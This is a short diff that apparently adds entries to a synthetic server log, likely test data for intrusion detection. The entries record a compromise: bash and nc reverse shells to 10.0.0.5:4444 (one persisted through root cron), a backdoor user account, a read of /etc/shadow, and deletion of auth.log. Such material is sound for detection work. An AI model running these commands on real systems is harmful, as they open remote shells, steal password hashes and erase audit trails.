@@ -7,4 +7,10 @@
 2026-02-18T10:02:00 server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
 2026-02-18T10:03:00 server bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
 2026-02-18T10:04:00 server useradd[3456]: new user: name=backdoor, UID=1003, GID=1003, home=/home/backdoor, shell=/bin/bash
+2026-02-18T10:05:30 server CRON[3333]: (root) CMD (nc 10.0.0.5 4444 -e /bin/bash)
+2026-02-18T10:06:00 server bash -c "cat /etc/shadow"
+2026-02-18T10:07:00 server bash -c "rm -rf /var/log/auth.log"
+2026-02-18T10:08:00 server bash -c "nc 10.0.0.5 4444"
+2026-02-18T10:09:00 server bash -c "nc 10.0.0.5 4444"
+2026-02-18T10:10:00 server bash -c "nc 10.0.0.5 4444"
 
